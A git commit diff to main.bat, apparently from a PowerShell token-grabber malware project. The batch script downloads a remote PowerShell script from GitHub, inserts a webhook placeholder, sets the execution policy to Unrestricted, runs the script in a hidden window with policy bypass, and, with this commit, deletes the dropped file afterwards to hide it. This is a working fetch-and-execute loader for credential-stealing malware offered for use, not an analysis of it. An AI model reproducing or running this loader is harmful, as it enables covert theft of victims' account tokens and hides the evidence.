fefa88386f67ede9ff3de0ced38773314d75ccbc
kdot227 <damndc227@gmail.com>
2023-05-19 15:29:16 -0500

    final fix

--- main.bat
+++ main.bat
@@ -7,6 +7,6 @@ cd /d %~dp0
 powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
 powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
 powershell -noprofile -executionpolicy bypass -WindowStyle hidden -file powershell123.ps1
-::del powershell123.ps1 /f /q
+del powershell123.ps1 /f /q
 timeout 3 > nul
 exit
